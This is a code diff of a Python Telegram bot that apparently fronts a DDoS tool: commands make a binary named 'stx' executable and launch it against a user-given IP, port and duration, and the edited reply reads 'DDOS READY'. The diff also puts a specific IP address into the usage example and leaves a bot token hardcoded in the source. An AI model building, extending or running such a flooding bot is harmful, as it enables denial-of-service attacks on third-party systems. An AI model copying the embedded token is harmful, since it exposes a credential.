@@ -1,4 +1,5 @@
 import subprocess
+import asyncio
 import nest_asyncio
 from telegram import Update
 from telegram.constants import ParseMode
@@ -10,12 +11,12 @@ TOKEN = "7932562452:AAHllBiuVC_bT_wpbHHoHn-VuTiJOLL1bCg"
 # /start command
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     help_text = (
-        "*STX Bot Help*\n\n"
+        "*STX Bot by @Kecee_Pyrite*\n\n"
         "Available commands:\n"
-        "`/permit` — Make the 'stx' binary executable\n"
-        "`/stx <ip> <port> <durasi>`\n\n"
+        "/permit — Kirimkan command ini sebelmum menggunakan bot\n"
+        "/stx `<ip> <port> <durasi>`\n\n"
         "*Example:*\n"
-        "`/stx 1.1.1.1 80 60`"
+        "/stx `158.10.108.179 5506 120`"
     )
     await update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN)
 
@@ -23,7 +24,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def permit(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         subprocess.run(["chmod", "+x", "stx"], check=True)
-        await update.message.reply_text("Permission granted: `chmod +x stx`", parse_mode=ParseMode.MARKDOWN)
+        await update.message.reply_text("DDOS READY ! SILAHKAN GUNAKAN /stx", parse_mode=ParseMode.MARKDOWN)
     except subprocess.CalledProcessError as e:
         await update.message.reply_text(f"Error:\n`{e}`", parse_mode=ParseMode.MARKDOWN)
 
@@ -31,7 +32,7 @@ async def permit(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def stx(update: Update, context: ContextTypes.DEFAULT_TYPE):
     args = context.args
     if len(args) != 3:
-        await update.message.reply_text("Usage:\n`/stx <ip> <port> <durasi>`", parse_mode=ParseMode.MARKDOWN)
+        await update.message.reply_text("Usage: /stx `<ip> <port> <durasi>`", parse_mode=ParseMode.MARKDOWN)
         return
 
     ip, port, durasi = args
@@ -58,6 +59,5 @@ async def main():
 
 # Entry point
 if __name__ == "__main__":
-    import asyncio
     nest_asyncio.apply()
-    asyncio.get_event_loop().run_until_complete(main())
+    asyncio.run(main())
